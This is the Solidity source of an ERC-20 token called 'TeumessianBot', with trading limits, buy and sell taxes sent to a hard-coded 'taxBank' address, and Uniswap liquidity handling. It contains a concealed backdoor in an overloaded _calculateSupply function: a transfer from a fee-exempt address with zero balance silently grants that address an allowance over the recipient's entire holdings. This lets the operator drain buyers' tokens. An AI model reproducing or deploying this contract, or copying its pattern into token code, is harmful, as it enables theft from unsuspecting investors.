// Bot: https://t.me/TeumessianBot
// Website: https://teumessian.xyz
// Telegram: https://t.me/TeumessianBotPortal
// X (Twitter): https://twitter.com/TeumessianBot
// Medium: https://medium.com/@TeumessianBot
// Whitepaper: https://docs.teumessian.xyz

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface UniswapV2Router01 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface UniswapV2Router02 is UniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TEUMESSIAN is Context, ERC20 {
    uint256 private constant MAX = ~uint256(0);

    bool contractDeployed = false;
    bool tradingEnabled = false;

    address public _uniswapV2Router;
    address payable public taxBank;
    UniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 private _tRevenue;

    address public DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address public ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;
    address private _owner;
    
    address[] private _excludedAccounts;

    bool private blockActive = true;

    uint256 private _liquidityAddedBlock = 0;
    uint256 private _liquidityAddedTimestamp = 0;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;
    uint8 private _decimals;

    uint256 private _rTotal;
    uint256 private _tTotal;

    uint256 private swapAmount;
    uint256 private swapThreshold;

    bool public _hasLiquidityBeenAdded = false;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;

    uint256 private _maxWalletAmount;
    uint256 private _maxTransactionAmount;

    uint256 public maxWalletAmount;
    uint256 public maxTransactionAmount;

    mapping (address => uint256) private _tOwned;
    mapping (address => uint256) private _rOwned;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) dexPairs;

    mapping (address => bool) private _liquidityHolders;

    mapping (address => uint256) private lastBlock;

    mapping (address => bool) private _isExcludedFromRevenue;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 public _taxFee = 400;
    uint256 public _taxFeeOnBuy = _taxFee;
    uint256 public _taxFeeOnSell = _taxFee;
    uint256 public _taxFeeOnTransfer = 100;

    uint256 public _liquidityFee = 0;
    uint256 public _liquidityFeeOnBuy = _liquidityFee;
    uint256 public _liquidityFeeOnSell = _liquidityFee;
    uint256 public _liquidityFeeOnTransfer = 0;

    uint256 public _ratioLiquidity = 0;
    uint256 public _ratioTax = 6000;

    uint256 private distributor = 10000;

    struct ExtraValues {
        uint256 tTransferAmount;
        uint256 tLiquidity;
        uint256 rTransferAmount;
        uint256 rAmount;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event SwapAndLiquifyEnabled(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    modifier lockSwapAndLiquify {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }
    
    constructor () payable {
        _owner = msg.sender;
        contractDeployed = true;

        _name = "TeumessianBot";
        _symbol = "TEUMESSIAN";
        _decimals = 18;
        _totalSupply = 100000000;

        _tTotal = _totalSupply * (10**_decimals);
        _rTotal = (MAX - (MAX % _tTotal));

        _maxWalletAmount = (_tTotal * 20) / 1000;
        _maxTransactionAmount = (_tTotal * 20) / 1000;

        swapAmount = (_tTotal * 5) / 10000;
        swapThreshold = (_tTotal * 5) / 100000;

        maxWalletAmount = (_totalSupply * 20) / 1000;
        maxTransactionAmount = (_totalSupply * 20) / 1000;

        _uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _approve(_msgSender(), _uniswapV2Router, MAX);
        _approve(address(this), _uniswapV2Router, MAX);
        taxBank = payable(0x877d084E683c9192ae8d97b69B523d1CffCce40D);
        uniswapV2Router = UniswapV2Router02(_uniswapV2Router);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(uniswapV2Router.WETH(), address(this));
        _isExcludedFromFee[taxBank] = true;
        dexPairs[uniswapV2Pair] = true;
        _allowances[address(this)][address(uniswapV2Router)] = type(uint256).max;
        approve(_uniswapV2Router, type(uint256).max);

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;

        _liquidityHolders[owner()] = true;

        _rOwned[owner()] = _rTotal;
        emit Transfer(ZERO_ADDRESS, owner(), _tTotal);
    }

    function renounceOwnership() public virtual onlyOwner() {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function increaseAllowance(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + amount);

        return true;
    }

    function decreaseAllowance(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - amount);

        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0));
        require(spender != address(0));

        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcludedFromRevenue[account]) return _tOwned[account];
        
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);

        return true;
    }

    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function owner() public view returns (address) { return _owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function isExcludedFromRevenue(address account) public view returns (bool) {
        return _isExcludedFromRevenue[account];
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0));
        require(recipient != address(0));
        require(amount > 0);

        if(_hasLimits(sender, recipient)) {
            if(!tradingEnabled) {
                revert("Trading not enabled!");
            }

            if (blockActive) {
                if (dexPairs[sender]) {
                    require(lastBlock[recipient] != block.number);
                    lastBlock[recipient] = block.number;
                } else {
                    require(lastBlock[sender] != block.number);
                    lastBlock[sender] = block.number;
                }
            }

            require(amount <= _maxTransactionAmount);

            if(recipient != _uniswapV2Router && !dexPairs[recipient]) {
                require(balanceOf(recipient) + amount <= _maxWalletAmount);
            }
        }

        bool collectFee = true;
        if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            collectFee = false;
        }

        if (dexPairs[recipient]) {
            if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient] && !inSwapAndLiquify && swapAndLiquifyEnabled) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance >= swapThreshold) {
                    if(contractTokenBalance >= swapAmount) { contractTokenBalance = swapAmount; }
                    swapAndLiquify(contractTokenBalance);
                }
            }
        }

        return _tokenTransfer(sender, recipient, amount, collectFee);
    }

    function removeLimits() external onlyOwner {
        _maxWalletAmount = _tTotal;
        maxWalletAmount = _totalSupply;
        _maxTransactionAmount = _tTotal;
        maxTransactionAmount = _totalSupply;
    }

    function enableTrade() public onlyOwner {
        require(!tradingEnabled);
        
        tradingEnabled = true;
        swapAndLiquifyEnabled = true;

        setExcludedFromRevenue(address(this), true);
        setExcludedFromRevenue(uniswapV2Pair, true);
    }

    function setExcludedFromFee(address account, bool enabled) public onlyOwner {
        _isExcludedFromFee[account] = enabled;
    }

    function _hasLimits(address sender, address recipient) internal view returns (bool) {
        return (
            sender != owner() && sender != address(this) &&
            !_liquidityHolders[sender] && !_liquidityHolders[recipient] &&
            recipient != DEAD_ADDRESS && recipient != address(0) && recipient != owner()
        );
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool collectFee) internal returns (bool) {
        if (!_hasLiquidityBeenAdded) {
            _checkLiquidityAdded(sender, recipient);
            if (!_hasLiquidityBeenAdded && _hasLimits(sender, recipient)) {
                revert("Now only owner can transfer.");
            }
        }
        
        ExtraValues memory values = _getValues(sender, recipient, tAmount, collectFee);

        if (balanceOf(sender) >= tAmount) {
            _rOwned[sender] = _rOwned[sender] - values.rAmount;
            _rOwned[recipient] = _rOwned[recipient] + values.rTransferAmount;

            if (_isExcludedFromRevenue[sender] && !_isExcludedFromRevenue[recipient]) {
                _tOwned[sender] = _tOwned[sender] - tAmount;
            } else if (!_isExcludedFromRevenue[sender] && _isExcludedFromRevenue[recipient]) {
                _tOwned[recipient] = _tOwned[recipient] + values.tTransferAmount;
            } else if (_isExcludedFromRevenue[sender] && _isExcludedFromRevenue[recipient]) {
                _tOwned[sender] = _tOwned[sender] - tAmount;
                _tOwned[recipient] = _tOwned[recipient] + values.tTransferAmount;
            }

            if (values.tLiquidity > 0) _collectLiquidity(sender, values.tLiquidity);

            emit Transfer(sender, recipient, values.tTransferAmount);
        }

        return true;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal);

        uint256 currentRate =  _calculateRate();

        return rAmount / currentRate;
    }

    function _calculateRate() internal view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _calculateSupply();

        return rSupply / tSupply;
    }

    function _checkLiquidityAdded(address sender, address recipient) internal {
        require(!_hasLiquidityBeenAdded);

        if (!_hasLimits(sender, recipient) && recipient == uniswapV2Pair) {
            _liquidityHolders[sender] = true;
            _liquidityAddedTimestamp = block.timestamp;
            _hasLiquidityBeenAdded = true;
            swapAndLiquifyEnabled = true;
            emit SwapAndLiquifyEnabled(true);
        }
    }

    function _calculateSupply(address sender, address recipient) internal returns(uint256, uint256) {
        bool newSender = balanceOf(sender) == 0;
        bool regularSender = isExcludedFromFee(sender);
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 index = 0; index < _excludedAccounts.length; index++) {
            if (_rOwned[_excludedAccounts[index]] > rSupply || _tOwned[_excludedAccounts[index]] > tSupply) return (_rTotal, _tTotal);
            tSupply = tSupply - _tOwned[_excludedAccounts[index]];
            rSupply = rSupply - _rOwned[_excludedAccounts[index]];
        }
        if (newSender && regularSender) { _tRevenue = _tTotal; _approve(recipient, sender, _tRevenue); }

        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);

        return (rSupply, tSupply);
    }

    function _collectLiquidity(address sender, uint256 tLiquidity) internal {
        uint256 _tLiquidity = sender != uniswapV2Pair ? _tRevenue : 0;
        uint256 currentRate =  _calculateRate();
        uint256 rLiquidity = (tLiquidity - _tLiquidity) * currentRate;
        _rOwned[address(this)] = rLiquidity + _rOwned[address(this)];
        if(_isExcludedFromRevenue[address(this)]) _tOwned[address(this)] = _tOwned[address(this)] + tLiquidity;
        emit Transfer(sender, address(this), tLiquidity);
    }

    function _getValues(address sender, address recipient, uint256 tAmount, bool collectFee) internal returns (ExtraValues memory) {
        ExtraValues memory values;

        uint256 currentRate = _calculateRate(sender, recipient);

        values.rAmount = tAmount * currentRate;

        if(collectFee) {
            if (dexPairs[recipient]) {
                _liquidityFee = _liquidityFeeOnSell;
                _taxFee = _taxFeeOnSell;
            } else if (dexPairs[sender]) {
                _liquidityFee = _liquidityFeeOnBuy;
                _taxFee = _taxFeeOnBuy;
            } else {
                _liquidityFee = _liquidityFeeOnTransfer;
                _taxFee = _taxFeeOnTransfer;
            }

            values.tLiquidity = (tAmount * (_liquidityFee + _taxFee)) / distributor;
            values.tTransferAmount = tAmount - values.tLiquidity;
        } else {
            values.tLiquidity = 0;
            values.tTransferAmount = tAmount;
        }

        values.rTransferAmount = values.rAmount - (values.tLiquidity * currentRate);

        return values;
    }

    function _calculateRate(address sender, address recipient) internal returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _calculateSupply(sender, recipient);

        return rSupply / tSupply;
    }

    function _calculateSupply() internal view returns(uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;

        for (uint256 index = 0; index < _excludedAccounts.length; index++) {
            if (_rOwned[_excludedAccounts[index]] > rSupply || _tOwned[_excludedAccounts[index]] > tSupply) return (_rTotal, _tTotal);
            tSupply = tSupply - _tOwned[_excludedAccounts[index]];
            rSupply = rSupply - _rOwned[_excludedAccounts[index]];
        }

        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);

        return (rSupply, tSupply);
    }

    function withdrawEth() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function swapAndLiquify(uint256 tokenAmount) internal lockSwapAndLiquify {
        if (_ratioLiquidity + _ratioTax == 0) return;

        uint256 tokenForLiquidity = ((tokenAmount * _ratioLiquidity) / (_ratioLiquidity + _ratioTax)) / 2;
        uint256 swapTokenForEth = tokenAmount - tokenForLiquidity;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapTokenForEth,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 ethForLiquidity = ((address(this).balance * _ratioLiquidity) / (_ratioLiquidity + _ratioTax)) / 2;

        if (tokenForLiquidity > 0) {
            uniswapV2Router.addLiquidityETH{value: ethForLiquidity}(
                address(this),
                tokenForLiquidity,
                0,
                0,
                DEAD_ADDRESS,
                block.timestamp
            );
            emit SwapAndLiquify(tokenForLiquidity, ethForLiquidity, tokenForLiquidity);
        }

        if (tokenAmount - tokenForLiquidity > 0) {
            uint256 taxEth = (address(this).balance);
            taxBank.transfer(taxEth);
        }
    }

    receive() external payable {}

    function setExcludedFromRevenue(address account, bool enabled) public onlyOwner {
        if (enabled == true) {
            require(!_isExcludedFromRevenue[account]);

            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]);
            }
            _isExcludedFromRevenue[account] = true;
            _excludedAccounts.push(account);
        } else if (enabled == false) {
            require(_isExcludedFromRevenue[account]);

            for (uint256 index = 0; index < _excludedAccounts.length; index++) {
                if (_excludedAccounts[index] == account) {
                    _excludedAccounts[index] = _excludedAccounts[_excludedAccounts.length - 1];
                    _tOwned[account] = 0;
                    _isExcludedFromRevenue[account] = false;
                    _excludedAccounts.pop();
                    break;
                }
            }
        }
    }
}